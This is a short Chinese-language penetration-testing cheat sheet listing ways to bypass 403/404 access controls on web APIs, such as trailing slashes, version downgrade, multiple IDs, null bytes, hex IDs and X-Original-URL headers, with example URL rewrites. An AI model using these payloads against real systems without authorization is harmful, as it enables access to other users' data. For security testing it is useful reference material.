响应绕过
========================================

403/404响应绕过
----------------------------------------

URL绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 尾部增加/
    - ``/api/v5/users/9`` -> ``/api/v5/users/10/``
    - ``/api/v5/users/9`` -> ``/api/v5/users//10//``
+ 版本降级
    - ``/api/v5/users/9`` -> ``/api/v4/users/10``
    - ``/api/v5/users/9`` -> ``/api/v3/users/10``
+ 端点枚举
    - ``/api/v5/users/9`` -> ``/api/v5/users/9/details``
+ 多id
    - ``/api/v5/users/9`` -> ``/api/v5/users/9,8``
    - ``/api/v5/users/9`` -> ``/api/v5/users?id=10,9``
+ 类型混淆
    - ``/api/v5/users/9`` -> ``/api/v5/users/*9*``
    - ``/api/v5/users/9`` -> ``/api/v5/users/9abc``
+ 数字类型
    - ``/api/v5/users/9`` -> ``/api/v5/users/0x10``
+ NULL
    - ``/api/v5/users/9`` -> ``/api/v5/users/9%00``
    - ``/api/v5/users/9`` -> ``/api/v5/users/9%00//``
+ 增加标头
    - ``X-Original-URL: /api/v5/users/10``
    - ``X-Forwarded-For: /api/v5/users/10``
    - 参考： ``srcPython\src\payloads\403_header_payloads.txt``
+ 空格编码
    - ``/api/v5/users/9`` -> ``/api/v5/users/%209``
    - 参考： ``srcPython\src\payloads\403_url_payloads.txt``